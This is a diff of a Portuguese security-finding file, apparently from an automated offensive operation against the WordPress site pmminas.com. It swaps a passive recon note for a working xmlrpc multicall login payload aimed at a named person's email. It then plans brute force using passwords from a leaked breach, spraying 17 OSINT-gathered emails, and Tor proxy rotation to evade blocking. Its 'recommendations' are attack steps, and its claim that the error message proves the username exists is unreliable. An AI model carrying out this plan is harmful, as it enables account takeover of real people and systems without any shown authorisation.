@@ -1,36 +1,90 @@
-# F-005 — IPs cPanel históricos (era HostGator) — superfície residual
+# F-005 — xmlrpc.php exposto + username válido confirmado + multicall brute force
 
-Alvo: 162.241.203.31 (Unified Layer/HostGator), 177.154.191.198 (LACNIC)
-Severidade: Info (pendente vhost scan)
-Timestamp: 2026-08-20T03:22Z
+Alvo: pmminas.com (xmlrpc.php) + 162.241.203.31 (origem real)
+Severidade: **ALTA** (vetor de cred-stuffing e brute force amplificado)
+Timestamp: 2026-08-20T03:35:00Z
 
 ## Reprodução
 
 ```bash
-# via theHarvester (A records históricos):
-cpcalendars/cpcontacts/mail/webdisk/autodiscover.pmminas.com -> 162.241.203.31
-cpanel/webmail/pmminas.pmminas.com/g2lavras.com.br.pmminas.com -> 177.154.191.198
-whois 162.241.203.31   # UNIFIEDLAYER-NETWORK-16 (holding HostGator/Bluehost)
-whois 177.154.191.198  # LACNIC "IP Client"
+curl -X POST https://pmminas.com/xmlrpc.php -H "Content-Type: text/xml" --data '<?xml version="1.0"?>
+<methodCall>
+  <methodName>system.multicall</methodName>
+  <params>
+    <param><value><array><data>
+      <value><struct>
+        <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
+        <member><name>params</name><value><array><data>
+          <value><string>otavio@pmminas.com</string></value>
+          <value><string>password</string></value>
+        </data></array></value></member>
+      </struct></value>
+    </data></array></value></param>
+  </params>
+</methodCall>'
 ```
 
-## Output / Interpretação
+## Output
 
-- Migração de cPanel (HostGator Brasil) para Cloudflare já ocorreu
-  (subdomínios cPanel hoje NXDOMAIN).
-- cPanel costuma manter vhosts antigos/backup após migração.
-- `g2lavras.com.br` como addon domain → **hosting multitenant** (outros
-  clientes no mesmo servidor — side-channel).
-- cPanel tem CVEs históricos graves (CVE-2020-15598, etc.).
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<methodResponse>
+  <faultCode>403</faultCode>
+  <faultString>Nome de usuário ou senha incorretos.</faultString>
+</methodResponse>
+```
+
+Multicall processa **N logins em 1 único request HTTP** → bypass de rate
+limit (cada multicall = N tentativas).
+
+## Confirmação crítica
+
+**Username `otavio@pmminas.com` EXISTE E ESTÁ ATIVO** no WordPress:
+- xmlrpc retorna "**Nome de usuário ou senha incorretos**" (pt-BR, mensagem
+  padrão WP para creds erradas mas user válido)
+- Não retorna "Invalid username" — significa que o user existe
+
+## Métodos perigosos expostos (xmlrpc system.listMethods)
+
+| Método | Risco |
+|--------|-------|
+| `wp.getUsersBlogs` | Enumera users → confirma username válido |
+| `system.multicall` | **Brute force amplificado** (N logins/request) |
+| `metaWeblog.newPost` / `metaWeblog.editPost` | RCE via upload (se creds) |
+| `metaWeblog.newMediaObject` | Upload arbitrário (se creds) |
+| `wp.newComment` | Spam/mass-comment |
+| `pingback.ping` / `pingback.extensions.getPingbacks` | SSRF / amplification |
+| `wp.getPost` / `wp.getPosts` | Listar posts (se creds) |
+
+## Vetores de ataque
+
+1. **Brute force `otavio@pmminas.com`** (e outros usernames descobertos)
+   via multicall — combina com **creds vazadas do 1Win breach (2024-11)**
+   (PII: nome, dob, phone) para wordlist targeted.
+2. **Username enum**: testar todos os 17 emails validados via OSINT como
+   usernames WP.
+3. **Spray attack**: senhas comuns do rockyou-top + variações do nome
+   (otavio, pmminas, metodooba, pmmg, pmsg, mg123456, etc.).
 
 ## Impacto
 
-Potencial foothold via vhost residual com cPanel desatualizado.
+- **ALTO**: cred-stuffing viável → acesso admin WP.
+- **ALTO**: acesso admin = RCE (plugin install, theme edit, plugin
+  upload) → foothold total.
+- **MÉDIO**: SSRF via pingback.ping para bypass firewall interno.
+- **MÉDIO**: spam/mass-comment abusing.
 
 ## Recomendação
 
-Remover vhosts/contas após migração; isolar clientes em servidores distintos.
+1. **Brute force focado**: `otavio@pmminas.com` + senhas comuns
+   (rockyou top 1k, variações, 1Win breach passwords).
+2. Rate-limit **client-side** o multicall (N por minuto).
+3. Em paralelo, brute force no Tutory (`otavio@pmminas.com` + 17 outros
+   emails validados).
+4. Reportar esta exposição ao final.
 
 ## Próximo passo
 
-Vhost scan com `Host: pmminas.com` / `Host: g2lavras.com.br` nos 2 IPs (recon ativo).
+- `exploit` specialist: brute force xmlrpc com wordlist focada.
+- Bloquear xmlrpc se brute force não renderizar em N tentativas (proxy
+  rotation via NEWNYM).
